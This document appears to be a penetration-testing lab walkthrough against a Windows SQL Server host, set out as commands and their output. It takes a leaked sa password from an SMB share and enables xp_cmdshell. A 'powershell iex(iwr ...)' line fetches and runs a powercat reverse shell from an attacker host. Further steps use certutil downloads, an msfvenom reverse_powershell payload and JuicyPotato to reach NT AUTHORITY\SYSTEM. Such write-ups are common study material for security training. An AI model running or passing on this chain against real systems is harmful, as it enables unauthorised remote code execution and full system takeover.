## NMAP

```
nmap -sCV -p- -A -T4 10.10.110.58
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 13:31 PDT
Nmap scan report for 10.10.110.58
Host is up (0.075s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-04-13T20:32:34+00:00; -59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-03-10T10:32:07
|_Not valid after:  2053-03-10T10:32:07
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49748/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-04-13T20:32:34+00:00; -59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-03-10T10:32:07
|_Not valid after:  2053-03-10T10:32:07
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -12m59s, deviation: 26m49s, median: -59s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SQL01-Hera
|   NetBIOS computer name: SQL01-HERA\x00
|   Workgroup: GENESIS\x00
|_  System time: 2023-04-13T21:32:24+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-13T20:32:28
|_  start_date: 2023-03-10T10:31:59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.60 seconds
```
## SMB Client

```
smbclient -N -L //10.10.110.58

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
	zach            Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.110.58 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
```
 smbclient -N //10.10.110.58/zach
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 19 01:20:20 2021
  ..                                  D        0  Fri Mar 19 01:20:20 2021
  mssql_test.udl                      A      378  Fri Mar 19 01:19:48 2021

		7690239 blocks of size 4096. 3247787 blocks available
smb: \> get mssql_test.udl 
getting file \mssql_test.udl of size 378 as mssql_test.udl (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
```
Looking at the mssql_test.udl file
```
cat mssql_test.udl
��[oledb]
; Everything after this line is an OLE DB initstring
Provider=SQLOLEDB.1;Password=x5Chuz8XbM;Persist Security Info=True;User ID=sa;Initial Catalog=master;Data Source=sql01-hera
```
MSSQL Client
```
mssqlclient.py sa:x5Chuz8XbM@10.10.110.58
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01-HERA\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01-HERA\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```
## Enable xp_cmdshell
```
SQL> enable_xp_cmdshell
[*] INFO(SQL01-HERA\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL01-HERA\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

sql01-hera\zach                                                                    

NULL                                                                               

SQL> xp_cmdshell dir
output                                                                             

--------------------------------------------------------------------------------   

```
we can use powercat for a reverseshell
git clone the powercat repo

## Echo RS and start HTTP Server
```❯ echo "powercat -c 10.10.14.21 -p 4444 -e cmd" >> powercat.ps1
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.110.58 - - [13/Apr/2023 14:08:25] "GET /powercat.ps1 HTTP/1.1" 200 -
```
## Execute RS 
```
SQL> EXEC xp_cmdshell 'powershell iex(iwr http://10.10.14.21/powercat.ps1 -useb)';
```
Catch on listener
```
 nc -lvp 4444
listening on [any] 4444 ...
10.10.110.58: inverse host lookup failed: Unknown host
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.58] 54337
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
## Checking Privs
```
C:\Users\zach\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled 
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

We see SeImpersonatePrivilege is enabled

Download Juicy Potato
start HTTP server in directory

```
certutil.exe -urlcache -split -f http://10.10.14.21/JuicyPotato.exe j.bat
```
Create payload
```
msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.21 lport=9001 > shell.bat
```
Start listening on port 9001 and transfer sell.bat to system.
```
certutil.exe -urlcache -split -f http://10.10.14.21/shell.bat shell.bat
```
Execute payload
```
:\Users\zach\Desktop>.\j -t * -p c:\Users\zach\Desktop\rev.ps1 -l 9002 -c {C5D3C0E1-DC41-4F83-8BA8-CC0D46BCCDE3}
.\j -t * -p c:\Users\zach\Desktop\rev.ps1 -l 9002 -c {C5D3C0E1-DC41-4F83-8BA8-CC0D46BCCDE3}
Testing {C5D3C0E1-DC41-4F83-8BA8-CC0D46BCCDE3} 9002
COM -> recv failed with error: 10038
```

with the error change the CLSID 
https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/

```
C:\Users\zach\Desktop>.\j -t * -p shell.bat -l 9002 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
.\j -t * -p shell.bat -l 9002 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 9002
......
[+] authresult 0
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
Catch it in your listener
```
❯ nc -lvp 9001
listening on [any] 9001 ...
10.10.110.58: inverse host lookup failed: Unknown host
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.58] 54380
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
